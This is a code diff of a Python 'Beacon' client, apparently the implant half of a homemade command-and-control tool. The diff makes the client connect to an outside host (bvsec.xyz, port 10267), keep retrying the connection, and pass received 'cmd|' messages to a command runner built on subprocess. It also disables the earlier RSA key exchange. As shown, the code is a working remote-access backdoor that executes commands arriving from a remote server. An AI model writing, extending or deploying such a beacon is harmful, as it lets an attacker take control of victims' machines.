@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 
-import socket,subprocess,time,string,rsa
+import socket,subprocess,time,string
+#import rsa
 
 class Beacon:
    #Contains client side behavior and state
@@ -12,13 +13,17 @@ class Beacon:
       self.server_ip = server_ip
       self.server_port = server_port
       self.debugging = True
-      self.pubkey,self.privatekey = rsa.newkeys(2048)
-      print(self.pubkey,self.privatekey)
+      #self.pubkey,self.privatekey = rsa.newkeys(2048)
+      #print(self.pubkey,self.privatekey)
 
    def connect(self):
-      self.sock.connect((self.server_ip,self.server_port))
-      pubkey_pem = self.pubkey.save_pkcs1(format='PEM')
-      self.sock.sendall(pubkey_pem)
+      try:
+         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+         self.sock.connect((self.server_ip,self.server_port))
+         #pubkey_pem = self.pubkey.save_pkcs1(format='PEM')
+         #self.sock.sendall(pubkey_pem)
+      except:
+         self.sock.close()
 
    def run_command(self,command):
       try:
@@ -38,38 +43,43 @@ class Beacon:
 
    def start(self):
       self.running = True
-      self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      self.connect()
       while self.running:
-            self.sock.settimeout(5)
-            try:
-               data = self.sock.recv(4096).decode()
-               if not data:
-                  # If no data is received, break the loop
-                  break
-               if self.debugging == True:
-                  print("Received:",data)
-               split = data.split("|")
-               if split[0] == "cmd":
-                  self.run_command(split[1])
-               elif split[0] == "quit":
-                  self.terminate()
-               else:
-                  self.sock.send("Unknown Error".encode())
-            except socket.timeout:
-                continue
-
+            self.connect()
+            if self.sock:
+                self.run()
+            else:
+                time.sleep(10)
+   
+   def run(self):
+      try:
+         while self.running:
+               self.sock.settimeout(5)
+               try:
+                  data = self.sock.recv(4096).decode()
+                  if not data:
+                     # If no data is received, break the loop
+                     break
+                  if self.debugging == True:
+                     print("Received:",data)
+                  split = data.split("|")
+                  if split[0] == "cmd":
+                     self.run_command(split[1])
+                  elif split[0] == "quit":
+                     self.terminate()
+                  else:
+                     self.sock.send("Unknown Error".encode())
+               except socket.timeout:
+                  continue
+      except:
+         self.start()
+            
    def terminate(self):
       self.running = False
-      self.sock.close()
+      if self.sock:
+         self.sock.close()
 
 def main():
-   beacon = Beacon("localhost",10267)
-   while True:
-      try:
-         beacon.start()
-         break
-      except:
-         time.sleep(10)
+   beacon = Beacon("bvsec.xyz",10267)
+   beacon.start()
 
 main()
